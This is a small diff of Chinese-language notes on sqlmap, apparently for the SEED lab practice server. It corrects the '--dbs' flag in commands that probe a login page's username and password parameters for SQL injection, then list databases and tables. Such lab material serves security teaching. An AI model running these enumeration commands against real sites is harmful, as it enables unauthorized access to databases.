@@ -98,7 +98,7 @@ sqlmap -h  或者 sqlmap --h
 sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" 
 
 //读取某个url用到的数据库系统中存在的数据库名称
-sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" --DBS
+sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" --dbs
 
 //读取某个数据库中的所有表
 sqlmap -u "http://www.seed-server.com/unsafe_home.php?username=admin&Password=" -D 数据库名 --tables
